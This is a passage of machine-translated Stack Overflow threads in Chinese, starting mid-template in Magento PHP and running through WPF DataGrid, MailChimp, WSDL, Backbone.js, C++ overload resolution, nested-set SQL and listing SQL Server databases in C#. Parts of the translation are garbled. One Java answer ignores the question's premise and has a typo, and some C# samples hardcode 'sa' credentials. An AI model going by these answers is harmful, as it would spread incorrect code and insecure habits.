    } elseif ($attribute->getBackendType() == 'decimal') {
      $filterBlockName = 'catalog/layer_filter_decimal';
    } else {
      $filterBlockName = 'catalog/layer_filter_attribute';
    }
    $result = Mage::app()->getLayout()->createBlock($filterBlockName)->setLayer($layer)->setAttributeModel($attribute)->init();
 ?>
    <div>
      <h4 class="menu-block-title"><?php echo $this->__($attribute->getFrontendLabel()) ?></h4>
      <ul class="menu-attr-list">
        <?php $counting = 1; ?>
        <?php foreach($result->getItems() as $option): ?>
          <?php $optionUrl = $category->getUrl() . "?" . $attribute->getAttributeCode() . "=" . $option->getValue(); ?>
          <?php if(!$option->getCount()){ continue; } ?>
          <li class="<?php echo ($counting >= $visible_items+1)?"visible-on-showmore":"" ?>" style="list-style: none;">
            <a class="cube" href="<?php echo $optionUrl ?>">
              <?php echo $option->getLabel() ?> <?php /* (<?php echo $option->getCount() ?>) */ ?>
            </a>
          </li>
          <?php $counting++; ?>
        <?php endforeach; ?>
        <?php if($counting >= $visible_items+1): ?>
          <li class="show-more-menuitem">
            <a href="javascript:void(0)" onclick="showMoreMenuItems(this); return false;" class="">
              <?php echo $this->__('Visa fler') ?>
            </a>
          </li>
        <?php endif; ?>
      </ul>
    </div>
 <?php endoreach; ?>
<?php endif; ?> 
```

当然，这可以扩展为允许显示所有属性，而不是将它们限制为 12（就像我在这里所做的那样）。虽然，我没有为自定义集合构建一个功能来显示这一点，但我相信遵循“目录/层”模型并查看集合的加载位置，您可以看到如何覆盖它并加载您自己的自定义集合.

# wpf - DataGrid 模板编辑

> ID：13703171
> 
> 赞同：0
> 
> 时间：2012-12-04T12:42:04.097
> 
> 标签：wpf, templates, datagrid

我用组合框创建了数据网格（从数据库读取数据），但需要解决一些问题，也许你们中的某个人可以帮助我；）

首先，我在dataGrid中使用了分组（按名称Wzór#分组），每次我想添加新元素时，它都会显示在底部：http: [//i45.tinypic.com/2l8yarp.png](http://i45.tinypic.com/2l8yarp.png) [^] 是吗可能，用这个（新的）项目创建类似“新组”的东西？例如： Wzór 1 Wzór1 niebieski 22 1 1 1 Wzór1 czerwony 23 1 1 1 Wzór 2 Wzór 2 czarny 55 1 1 1 添加新项目 ComboBox ComBox ComboBox TextBox TextBox TextBox （与图中标记的完全相同）。我的意思是这样的想法：http: [//i45.tinypic.com/2s0ms90.png](http://i45.tinypic.com/2s0ms90.png) [^]

我发现的第二个问题是，当我添加新项目并更改 ComboBox1、2 或 3 中的任何内容，然后当我开始编辑任何文本框时，组合框中的所有值都消失了 - 有什么方法可以解决它？

这是源代码（实际上它不是很复杂，我有 3 种方法，从数据库中填充 combobox1、combobox2 和 combobox3，然后在按钮单击创建新产品项后，我将其添加到列表中）：

```
wzoryCount = wzoryCB.Items.Count;
            List<Produkt> Produkty = new List<Produkt>();
           // for (int i = 0; i < wzoryCount; i++)
            //{

                Produkt p = new Produkt { wzor = "", kolor = "", cena = 0, rozmiar = "", indeks = "", kod = "" };
                Produkty.Add(p);
           // }

            dataGrid1.ItemsSource = Produkty;
            ListCollectionView collection = new ListCollectionView(Produkty);
            collection.GroupDescriptions.Add(new PropertyGroupDescription("wzor"));
            dataGrid1.ItemsSource = collection; 
```

我想，我需要在数据网格的 beginEdit 方法中做一些事情，但是当我把消息框放在那里时，当我在组合框中更改任何内容时它不会出现，但在我更改文本框时会出现。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:54:49.293

首先，您需要 ObservableCollection，而不是 List。其次，您可以在 xaml 中执行此操作：

```
<DataGrid ItemsSource="{Binding Produkty}">
    <DataGrid.Columns>

        <DataGridTemplateColumn Header="wzor">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding wzor}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="kolor">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding kolor}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="cena">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding cena}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="rozmiar">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding rozmiar}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="indeks">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding indeks}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="kod">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <TextBlock Text="{Binding kod}"/>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

    </DataGrid.Columns>
</DataGrid> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:10:07.163

太长的评论，所以生病在这里发布。这是我在 xaml 中使用的代码，所以我猜你的回答不起作用

```
 <DataGrid.Columns>

        <!--<DataGridTextColumn Header="Wzór" Binding="{Binding Path=wzor}"  ></DataGridTextColumn>-->

        <DataGridTemplateColumn Header="Wzór">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <ComboBox ItemsSource="{StaticResource wzoryList}" SelectedItem="{Binding wzor}"></ComboBox>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="Kolor">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <ComboBox ItemsSource="{StaticResource koloryList}" SelectedItem="{Binding kolor}"></ComboBox>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTemplateColumn Header="Rozmiar">
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <ComboBox ItemsSource="{StaticResource rozmiarList}" SelectedItem="{Binding rozmiar}"></ComboBox>
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>

        <DataGridTextColumn Header="Indeks" Binding="{Binding Path=indeks}" ></DataGridTextColumn>
        <DataGridTextColumn Header="Kod" Binding="{Binding Path=kod}"></DataGridTextColumn>
        <DataGridTextColumn Header="Cena" Binding="{Binding Path=cena}" ></DataGridTextColumn> 
```

# magento - magento 中的 mailchimp 集成

> ID：13703172
> 
> 赞同：1
> 
> 时间：2012-12-04T12:42:18.827
> 
> 标签：magento, magento-1.7, mailchimp

现在听说有效`mailchimp`的**电子邮件营销**

**所以我**[在这里](http://www.magentocommerce.com/magento-connect/mage-monkey-mailchimp-integration-4865.html)下载了它

但我有几个问题

1.  mailchimp 的优势是什么？
2.  更好的 mailchimp 教程？
3.  更好的 mailchimp 教程？

任何人请帮助我

```
I want to integrate mailchimp  in magento 
```

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T15:35:37.320

优点...

使用 Magento 通讯功能可能会禁止您从 Web 服务器发送电子邮件。大多数托管计划限制了可以发送的交易电子邮件的数量，原因如下。如果他们最终发送了太多类似垃圾邮件的电子邮件，他们将被列入黑名单，然后他们的所有客户都会因为一些不良玩家而受到惩罚。

他们宁愿您发送可能被退回的促销电子邮件，或者最终通过电子邮件服务提供商被标记为未经请求的商业电子邮件，该电子邮件服务提供商监控和清理任何导致不必要的垃圾邮件进入系统的活动，并通过 TOS 进行限制，其中列出可以来自（现有客户、订阅的人、希望接收促销电子邮件并通过其他方式注册的人）。

Mail Chimp 就是这样的电子邮件服务提供商之一，有几个，一对夫妇为 Magento 创建了集成模块，因此您不必导出您的时事通讯订阅者并将它们导入电子邮件服务。

Mail Chimp 还能够为您提供统计数据，并将与 Google Analytics（分析）相关联，因此您可以开始跟踪促销电子邮件的效果，可以尝试不同的方法，并通过来自的链接推荐查看真正有效的方法以及客户对促销电子邮件感兴趣的内容您包含的每个项目。使用 Magento，你可以把东西扔在墙上，然后希望有东西能粘住和柠檬滴。从这里你可以从“嗯，无论如何......”响应到“嗯，我想我想要这个”。

您选择的任何电子邮件服务提供商都可以提供此类统计和分析... Magento Newsletter 不能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:57:02.813

这是直接从我最近提交的与第三方通讯系统集成的 Magento 网站的提案中复制/粘贴的（在这种情况下，我使用的是我喜欢的 Fontis Campaign Monitor 模块）；

” 默认的 Magento 电子邮件通讯功能不如它可能的那么好。我通常会将电子邮件通讯提交框连接到 MailChimp 或 Campaign Monitor 之类的服务（我推荐后者）。

它们允许您管理您的分发列表并自己生成和自定义电子邮件模板，这些模板实际上会到达您客户的收件箱，而不会在他们的电子邮件客户端中收到垃圾邮件、退回邮件或看起来很糟糕。这些系统允许您在大量电子邮件客户端中测试您的时事通讯，并会告知您所犯的任何错误（即错误选择的可发送垃圾邮件的关键字）。

他们将允许您从他们的服务器将合作发送到您的分发列表，并且还将提供有关您的电子邮件活动的统计信息 - 跳出率、打开率、点击率、标记为垃圾邮件的数字、取消订阅的用户、他们所有不同的地理位置去了等

在您获得大约 2000 名收件人之前，它们是免费的，之后您只需支付少量费用即可获得非常好的服务。"

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-24T01:27:03.323

You can find examples and demos in [Third-Party API Wrappers for PHP](http://help.mandrill.com/entries/21738166-api-wrappers) repositories.

# java - 推荐 java 框架来加载 WSDL url/文件，获取方法列表等

> ID：13703174
> 
> 赞同：0
> 
> 时间：2012-12-04T12:42:22.747
> 
> 标签：java, web-services, wsdl, spring-ws, wsdl4j

我必须实现一个可以与 WSDL 一起使用的 java 组件，您是否知道任何可以简化该解决方案并避免我重新发明轮子的框架（也许是 wsdl4j？）

这是我倾向于支持的基本操作（最终用户必须从 UI 中完成所有这些操作，因此无法提前知道 wsdl url 以生成类，一切都在运行时）：

1.  为了能够加载 WSDL url 以便服务器读取其内容，提供可用方法列表并知道如何激活 Web 服务调用。
2.  应该有可能加载本地 WSDL 文件。
3.  如果提供 WSDL url，服务器应支持 http 和 https 格式
4.  为了能够从 WSDL 中了解所需的参数，以便我能够配置参数并激活 Web 服务调用，让我们假设在计划的基础或任何其他触发器上。
5.  加载 WSDL 文件后，我将获得所需变量及其类型的列表
6.  为了能够创建一个集成点，以便我能够在我的应用程序中使用这个集成点（保留所有这些设置和映射，并在需要时执行 web 服务调用）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:50:35.687

[试试 Apache CXF，从这里](http://cxf.apache.org/resources-and-articles.html)开始有很多阅读内容，还有一本书，[Apache CXF Web 服务开发。](http://www.packtpub.com/apache-cxf-web-service-development/book)

# jquery - Backbone.js 用于浏览器内页面布局编辑器？

> ID：13703183
> 
> 赞同：1
> 
> 时间：2012-12-04T12:43:07.030
> 
> 标签：jquery, ajax, django, backbone.js, django-models

我正在开发一个 Web 应用程序，它允许用户编辑页面上的元素（就像您可以使用 Adob​​e InDesign 一样）。可以拖动、选择对象，并为用户提供一个侧边栏，其中包含可以修改的对象的所有属性。

数据存储在数据库中的服务器上。我正在使用*Django*和*sweetpie*来为数据库中的数据提供一个简单的 REST 接口。

基本上数据的结构如下：

*   文档
    *   页
        *   页面对象

我已经使用 jQuery 和 jQueryUI 进行了一些测试，它们提供了允许对象选择、拖放等所需的大部分代码。一切都很好。

现在我正在考虑最好的方法是存储/管理/提取/更新页面上所有这些对象的信息。我可以手动完成这一切，`jQuery.ajax()`在数组、字典中使用和存储信息，并将它们链接到 DOM 元素。但是，我觉得有相当多的重新发明轮子和涉及的样板代码是可以避免的。

所以我在网上搜索并发现了 Backbone.js。它让我想起了 Django 的 ORM，并且似乎使管理所有数据变得更简单。据我了解 Backbone.js 的想法，它允许我创建一个类似于在服务器上的模型中定义的对象类，并使用它来存储有关对象的所有信息。

是否适合使用 Backbone.js 来完成这项任务？我查看了它的文档，还看到它支持使用 REST/Ajax 进行同步。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T19:01:48.753

Backbone 可能适合您的需求，因为它确实提供**了一种抽象，用于**以不耦合到 DOM 的方式管理您的数据，即通过`Backbone.Model`和`Backbone.Collection`.

**Backbone 模型和集合通过处理 AJAX 生命周期**可以轻松管理与后端的通信。它还具有有用的约定，用于执行诸如客户端验证和围绕模型属性更改的发布/订阅之类的事情。

另一个需要注意的重要事情是，Backbone 很容易以零碎的方式使用。您可以利用模型概念并忽略视图/路由器或仅将其用于事件管理等。

文档非常好。[看一看。](http://backbonejs.org/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T19:06:34.300

您应该认为[ember.js](http://emberjs.com/)是一个出色的工具，没有时间管理应用程序（不是微不足道的）来生成服务质量调查。并且已经完成了 emberjs 的欣赏。因为这是他第一次完全呆在 php 服务器端，并且除了 REST 之外没有使用它。

还具有出色的[文档](http://emberjs.com/documentation/)，并且非常易于扩展。

# c++ - 带有删除的移动构造函数的模棱两可的重载

> ID：13703186
> 
> 赞同：10
> 
> 时间：2012-12-04T12:43:14.447
> 
> 标签：c++, g++

如果定义了 BREAK，g++ 4.6.3 和 4.7.2 将无法编译以下代码（在 c++0x 模式下）。

```
template<class T> struct Test {
    Test(T&) {}
#ifdef BREAK
    Test(T&&) = delete;
#endif
};

void func(Test<int> const&) {}
void func(Test<double> const&) {}

int main()
{
    int x = 0;
    func(x);
    return 0;
} 
```

错误是

```
error: call of overloaded 'func(int&)' is ambiguous 
```

而 clang 3.2 RC2 和 VC11 （如果我替换`Test(T&&) = delete;`为`private: Test(T&&);`）接受代码。

我看不出哪里应该模棱两可。

这是一个 g++ 问题吗？（我不知道在 gcc 错误列表中搜索什么......）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T13:22:39.227

已删除的构造函数参与重载决议（[是否始终声明特殊成员函数？](https://stackoverflow.com/questions/8628094/are-the-special-member-functions-always-declared)）；这是必要的，以便可以使用已删除的构造函数来防止转换（摘自 8.4.3p3）：

```
struct onlydouble {
  onlydouble(std::intmax_t) = delete;
  onlydouble(double);
}; 
```

函数删除的执行在编译过程中很晚，在重载决议（8.4.3p2）之后，因此重载决议无法根据删除区分构造函数。gcc 是正确的，而 clang 和 VC11 是不正确的。

请注意，在函数调用表达式中存在歧义`func(x)`，其中参数`x`是类型的左值，`int`id表示在 and 的第一个（唯一）参数中`func`具有参数类型的重载集；那么可用的转换序列是：`const Test<int> &``const Test<double> &`

1.  `int`左值；`int &`; `Test<int>`暂时的; `const Test<int> &`,
2.  `int`左值；`int`右值；`double`右值；`double &&`; `Test<double>`暂时的; `const Test<double> &`.

这两个序列是用户定义的等秩转换序列，因此是模棱两可的。`Test<double>::Test(double &&)`在这个阶段，构造函数被删除的事实是无关紧要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:43:20.797

GCC 中有一个开放的错误： http://gcc.gnu.org/bugzilla/show_bug.cgi?id= [54425](http://gcc.gnu.org/bugzilla/show_bug.cgi?id=54425)。

CLANG 是正确的，GCC 需要解决这个问题。

# java - 如何在没有空格的字符串中找到子字符串的最大频率

> ID：13703188
> 
> 赞同：-1
> 
> 时间：2012-12-04T12:43:16.753
> 
> 标签：java, string, parsing, split

让我们假设字符串就像“aababcabcdabcdeabcdefabcdefg”。那么如何找到最大（所有可能的）子串的频率。

ps：字符串之间没有空格。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:51:11.463

```
String stArray[] = s.split("\\s+");
int large =0;
String largeSt="";
for(int i=0;i<stArray.length;i++)
 {
    if(stArray[i].length() >large)
        {
          largeSt=stArray[i];
          large = stArray[i].length();
         }
 }
system.out.println("very large :"+largeSt);
if you want to find frequency just count from array by matching 
```

# sql-server - 层次组织单位自下而上的方法

> ID：13703189
> 
> 赞同：0
> 
> 时间：2012-12-04T12:43:21.403
> 
> 标签：sql-server, design-patterns

我有一个组织用户管理结构，例如`Level 5`在组织单位职位上的用户自动在`Level 4, 3, 2, 1`.

正如您在屏幕截图中看到的那样。

![在此处输入图像描述](../Images/fbe7577348378c0c6f3d907ec7bb7efa.png)

每个组织单位都有自己的`ID`和每个用户。所以我有一个额外的表来存储`groupId<->userId`每个级别的所有关系。在这种情况下，我可以获取所有用户，例如从级别 3 获取所有用户，因为所有用户都使用 n:n 表相关联。

这种方式很容易查询用户是否在指定的组织单位中，但是......保持这种结构一致很复杂。

示例：如果我从中删除用户，`Level 3/Employee`也必须从 中删除`Level 2`，但前提`Level 1`是该用户不在 中`Level B/Employee`。

所以问题是。由于我无法更改用户自下而上继承组织单位的方式，因此有一种方法或设计模式如何实现这种方法，让用户只引用一次到他的最终位置。

示例：我引用了一个用户，`Level 5/employee`并将其保存在数据库中，但我不想为 添加关系`Level 4 - 1`，但我仍然想快速查询用户是否在`Level 2`.

我不想要任何详细代码，这更像是一个通用的设计问题，因为我想重新设计我的用户管理以使其不易出错。如果我可以使用 SQL 快速查询数据（例如使用 MS SQL 进行 CTE 查询），那也很棒，但它通常应该在 MVC（使用 RoR）环境中工作。

如果有人需要更多详细信息或信息，我将发布 ofc。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T08:12:33.570

当我得到很多答案时：）我做了更多的调查，现在有了最终的方法。

答案是使用嵌套树来执行快速查询。

我做了什么：

创建用户表。

```
CREATE TABLE [dbo].[actor_users](
    [id] [int] NOT NULL,
    [manager_id] [int] NULL,
    [deputy_id] [int] NULL,
    [username] [nvarchar](48) NOT NULL,
    [pwd] [nvarchar](40) NULL,
    [pwd_url] [char](38) NULL,
    [guid] [char](38) NULL,
    [deactivated] [smallint] NULL,
    [lastname] [nvarchar](48) NULL,
    [middlename] [nvarchar](48) NULL,
    [firstname] [nvarchar](48) NULL,
    [acronym] [nvarchar](16) NULL,
    [employee_nr] [nvarchar](16) NULL,
    [department] [nvarchar](250) NULL,
    [cost_unit] [nvarchar](16) NULL,
    [desc] [nvarchar](max) NULL,
    [email] [nvarchar](192) NULL,
    [sex] [int] NULL,
    [group_ids] [nvarchar](4000) NULL,
    [picture_id] [int] NULL,
    [lcid] [int] NULL,
 CONSTRAINT [ct_actor_users] PRIMARY KEY CLUSTERED 
( [id] ASC ) WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY] ) ON [PRIMARY] 
```

创建组表。

```
CREATE TABLE [dbo].[actor_groups](
    [id] [int] NOT NULL,
    [parent_id] [int] NULL,
    [group_name] [nvarchar](max) NULL,
    [group_type] [int] NOT NULL,
    [group_reference] [int] NOT NULL,
    [description] [nvarchar](max) NULL,
    [depth] [int] NULL,
    [left] [int] NULL,
    [right] [int] NULL,
    [id_path] [nvarchar](max) NULL,
    [name_path] [nvarchar](max) NULL,
 CONSTRAINT [ct_actor_groups] PRIMARY KEY CLUSTERED 
( [id] ASC ) WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY] 
```

我用大约 10k 行随机用户填充了用户表。

现在我创建了一些随机树

```
-- create some random tree for testing
DECLARE @id int;
DECLARE @name nvarchar(max);
WHILE (SELECT COUNT(*) FROM actor_groups)<1000 
BEGIN
SET @id = (SELECT ISNull(MAX(id),0) + 1 FROM actors);
SET @name = 'random_ou' + CAST(NEWID() AS nvarchar(40));

INSERT INTO actor_groups (id, parent_id, group_name, group_type, group_reference, [description], depth, [left], [right], id_path, name_path) 
SELECT @id
  , (SELECT TOP 1 id FROM actor_groups ORDER BY NEWID()) AS parent_id
  , @name group_name
  , 3 group_type
  , -1 group_reference
  , '' [description]
  , 0 depth
  , 0 [left]
  , 0 [right]
  , '' id_path
  , '' name_path
END 
```

在此之后我必须更新嵌套的集合关系....

```
-- update tree 
WHILE EXISTS (SELECT * FROM actor_groups WHERE depth IS NULL) 
UPDATE tr SET 
  tr.depth = par.depth + 1 , 
  tr.id_path = par.id_path + ',' + CAST(tr.id AS nvarchar(255)) , 
  tr.name_path = (CASE par.id WHEN 40 THEN '' ELSE par.name_path + '/' END) + tr.group_name
FROM actor_groups AS tr 
INNER JOIN actor_groups AS par ON (tr.parent_id = par.id) 
WHERE par.depth >=0 AND tr.depth IS NULL

GO

-- left, right nested set
WITH treerows AS
( SELECT actor_groups.*, ROW_NUMBER() OVER (ORDER BY id_path) AS Row FROM actor_groups )

UPDATE actor_groups
SET [left] = tbl.Lft
  , [right] = tbl.Rgt
FROM actor_groups
JOIN (SELECT
  ER.id,
  ER.id_path,
  ER.depth,
  ER.Row,
  (ER.Row * 2) - ER.depth AS Lft,
  ((ER.Row * 2) - ER.depth) +
    (
        SELECT COUNT(*) * 2
        FROM treerows ER2
        WHERE ER2.id_path LIKE ER.id_path + ',%'
    ) + 1 AS Rgt
FROM treerows ER
) tbl ON tbl.id = actor_groups.id 
```

现在我做了一些随机映射......

```
-- do some random mappings
DECLARE @map int;
DECLARE @mapuser int;
DECLARE @counter int;
SET @counter = 1;
WHILE @counter<1000 
BEGIN
  SET @map = (SELECT TOP 1 id FROM actor_groups ORDER BY NEWID())
  SET @mapuser = (SELECT TOP 1 id FROM actor_users ORDER BY NEWID())
  INSERT INTO actor_mappings ([group_id], [user_id], imported) VALUES (@map, @mapuser, 0)
  SET @counter = @counter + 1;
END 
```

所以现在我有一个组和一个用户表。用户有 10.000 个用户，我的树有大约 1.000 个节点。我确实启动了几次随机映射 SQL，所以我有大约 100.000 个映射。

我的查询：

```
SELECT DISTINCT 
      m.[user_id] AS luserid
    , org.[id] AS lgroupid
    , m.imported AS bimported
  FROM [test].[dbo].[actor_groups] org
  JOIN [actor_groups] org2 ON org2.[left] BETWEEN org.[left] AND org.[right]
  JOIN actor_mappings m ON org2.id = m.group_id 
```

如果我不缩小查询范围，查询将在大约 700 毫秒内运行。在我的测试中，寻找一个特殊的节点或用户大约需要 150-300 毫秒。

**解决方法：** 这可以使用嵌套集来完成。

用我的 1.000 个节点更新树大约需要 1 秒，并且在我的表上没有任何附加索引的情况下查询数据也总是低于 1 秒。

希望这可以帮助其他面临同样问题的人。

# java - 用于 PDF 比较的 iText API

> ID：13703190
> 
> 赞同：0
> 
> 时间：2012-12-04T12:43:21.407
> 
> 标签：java, pdf, itext

我可以使用 iText API 来比较两个 PDF 文件吗？我已经通过stackoverflow上的各种方法来比较PDF文件，例如工具，一些实用程序，例如imagemagick等。我希望比较的PDF是带有图表，表格和文本等的财务报告。我们必须比较大量文件并想通过命令行实用程序来完成。有一个 ComparePDF 命令行工具，但它只输出两个文件是否包含差异。我们想打印一份文件差异日志。我们可以通过 iText 做到这一点吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T12:51:27.510

你想比较什么？iText 可用于比较结构和语法，但是... 两个不同的 PDF 看起来与人眼相同，但内部可能具有完全不同的结构和语法。

在 iText，我们编写了使用 GhostScript 创建每个页面图像的 JUnit 测试。这些图像在每个像素的基础上相互比较。

我们还在 JUnit 测试中使用 iText，但这些测试更多地关注结构和语法，而不是内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-04-06T12:11:39.003

PDF比较需要使用Myers O(ND) diff算法，itext或pdfbox api没有提供pdf比较的方法，可以使用itext提取这些文件的文本和坐标，以后使用Myers O(ND) diff算法找出差异并突出显示变化。

# c# - 如何使用 c#.net 从组合框中的 sql server 获取所有数据库的列表

> ID：13703193
> 
> 赞同：17
> 
> 时间：2012-12-04T12:43:24.400
> 
> 标签：c#, sql-server-2008

我正在通过文本框输入源名称用户 ID 和密码，并希望数据库列表应列在组合框中，以便用户可以选择所有四个选项源名称、用户 ID、密码和数据库名称来执行连接

数据库将根据用户从其他系统中检索。用户将输入 IP、用户 ID 和密码，他们应该在组合框中获得数据库列表，以便他们可以选择所需的数据库并执行连接

```
private void frmConfig_Load(object sender, EventArgs e)
{
    try
    {
        string Conn = "server=servername;User Id=userid;" + "pwd=******;";
        con = new SqlConnection(Conn);
        con.Open();

        da = new SqlDataAdapter("SELECT * FROM sys.database", con);
        cbSrc.Items.Add(da);
    }
    catch (Exception ex)
    {
        MessageBox.Show(ex.Message);
    }
} 
```

我正在尝试这样做，但它没有生成任何数据

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-12-04T12:50:41.460

[系统数据库](http://msdn.microsoft.com/en-us/library/ms178534.aspx)

```
SELECT name
FROM sys.databases; 
```

编辑：

我建议使用 IDataReader，返回一个列表并缓存结果。您可以简单地将下拉列表绑定到结果，并在需要时从缓存中检索相同的列表。

```
public List<string> GetDatabaseList()
{
    List<string> list = new List<string>();

    // Open connection to the database
    string conString = "server=xeon;uid=sa;pwd=manager; database=northwind";

    using (SqlConnection con = new SqlConnection(conString))
    {
        con.Open();

        // Set up a command with the given query and associate
        // this with the current connection.
        using (SqlCommand cmd = new SqlCommand("SELECT name from sys.databases", con))
        {
            using (IDataReader dr = cmd.ExecuteReader())
            {
                while (dr.Read())
                {
                    list.Add(dr[0].ToString());
                }
            }
        }
    }
    return list;

} 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-12-04T13:01:56.060

首先添加以下程序集：

*   Microsoft.SqlServer.ConnectionInfo.dll
*   Microsoft.SqlServer.Management.Sdk.Sfc.dll
*   Microsoft.SqlServer.Smo.dll

从

> C:\Program Files\Microsoft SQL Server\100\SDK\Assemblies\

然后使用下面的代码：

```
var server = new Microsoft.SqlServer.Management.Smo.Server("Server name");

foreach (Database db in server.Databases) {
    cboDBs.Items.Add(db.Name);
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-04T12:52:24.880

您可以使用以下查询之一：

*   `EXEC sp_databases`
*   `SELECT * FROM sys.databases`

哔叽

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-04-16T08:40:42.290

简单的使用`GetSchema`方法：

```
using (SqlConnection connection = GetConnection())
{
    connection.Open();
    DataTable dtDatabases = connection.GetSchema("databases");

    //Get database name using dtDatabases["database_name"]
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-05-07T13:59:57.513

```
 using (var connection = new System.Data.SqlClient.SqlConnection("ConnectionString"))
    {
        connection.Open();
        var command = new System.Data.SqlClient.SqlCommand();
        command.Connection = connection;
        command.CommandType = CommandType.Text;
        command.CommandText = "SELECT name FROM master.sys.databases";

        var adapter = new System.Data.SqlClient.SqlDataAdapter(command);
        var dataset = new DataSet();
        adapter.Fill(dataset);
        DataTable dtDatabases = dataset.Tables[0];
    } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-09-19T11:07:30.550

尝试这个：

```
SqlConnection con = new SqlConnection(YourConnectionString);
SqlCommand cmd = new SqlCommand("SELECT name from sys.databases", con);
con.Open();
SqlDataReader dr = cmd.ExecuteReader();
while (dr.Read())
{
    cbSrc.Items.Add(dr[0].ToString());
}
con.Close(); 
```

或这个：

```
DataSet ds = new DataSet();
SqlDataAdapter sqlda = new SqlDataAdapter("SELECT name from sys.databases", YourConnectionString);
sqlda.Fill(ds);
for (int i = 0; i < ds.Tables[0].Rows.Count; i++)
{
    cbSrc.Items.Add(ds.Tables[0].Rows[i][0].ToString());
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-24T12:54:44.687

```
 How to get list of all database from sql server in a combobox using c# asp.net windows application  
     try
        {
            string Conn = "server=.;User Id=sa;" + "pwd=passs;";
            SqlConnection con = new SqlConnection(Conn);
            con.Open();

            SqlCommand cmd = new SqlCommand();
         //   da = new SqlDataAdapter("SELECT * FROM sys.database", con);
            cmd = new SqlCommand("SELECT name FROM sys.databases", con);
           // comboBox1.Items.Add(cmd);
            SqlDataReader dr;
            dr = cmd.ExecuteReader();
            if (dr.HasRows)
            {
                while (dr.Read())
                {
                    //comboBox2.Items.Add(dr[0]);
                    comboBox1.Items.Add(dr[0]);
                }
            }

           // .Items.Add(da);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        } 
```

# c# - BaseStream 底层流

> ID：13703197
> 
> 赞同：0
> 
> 时间：2012-12-04T12:43:37.340
> 
> 标签：c#, stream

我试图读取一个二进制文件，它是以某种模式编写的，例如：`string, string, byte`

我上网并找到了这段代码：

```
while (br.BaseStream.Position<br.BaseStream.Length)
{
    br.ReadString();
    br.ReadString();
    br.ReadByte(); 
} 
```

即使它是简单的代码，我也无法理解底层流（BaseStream）的含义？有人可以给我一个简短的解释吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:02:44.750

.NET 提供了不同的对象来读取或写入数据。基本上有 DataWriters 和 DataReader 可以写入或读取不同的流。[流](http://en.wikipedia.org/wiki/Stream_%28computing%29)表示数据源（例如文件）到应用程序内存（或返回）之间的数据流。

要以定义的方向访问流，您可以使用读取器或写入器。`BinaryReader`是数据读取器的一个示例。它应该从流中读取二进制数据。流通常继承自一个名为`[Stream](http://msdn.microsoft.com/en-us/library/system.io.stream.aspx)`. 有不同类型的流代表不同的数据源。例如，a`[FileStream](http://msdn.microsoft.com/en-us/library/system.io.filestream.aspx)`将数据读取或写入 HDD 上的文件，而 a`[MemoryStream](http://msdn.microsoft.com/en-us/library/system.io.memorystream.aspx)`将数据读取或写入 RAM。因此，流的实现描述**了数据的存储位置**。

